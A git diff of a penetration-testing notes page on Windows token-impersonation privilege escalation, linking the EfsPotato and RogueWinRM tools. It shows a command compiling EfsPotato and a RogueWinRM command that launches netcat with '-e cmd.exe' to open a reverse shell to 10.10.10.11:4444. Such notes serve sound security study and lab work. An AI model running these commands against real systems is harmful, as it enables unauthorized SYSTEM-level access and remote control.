@@ -9,21 +9,24 @@ metaLinks:
 
 These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
 
-{% embed url="https://github.com/antonioCoco/RogueWinRM" %}
-
 ```powershell
 C:>/ whoami /priv
 
 Privilege Name                Description                               State   
 ============================= ========================================= ========
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
-SeAuditPrivilege              Generate security audits                  Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
-SeCreateGlobalPrivilege       Create global objects                     Enabled 
-SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
 
+{% embed url="https://github.com/zcgonvh/EfsPotato.git" %}
 
+{% code overflow="wrap" %}
+```bash
+C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
+```
+{% endcode %}
+
+{% embed url="https://github.com/antonioCoco/RogueWinRM" %}
+
+```powershell
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.10.11 4444"
 ```
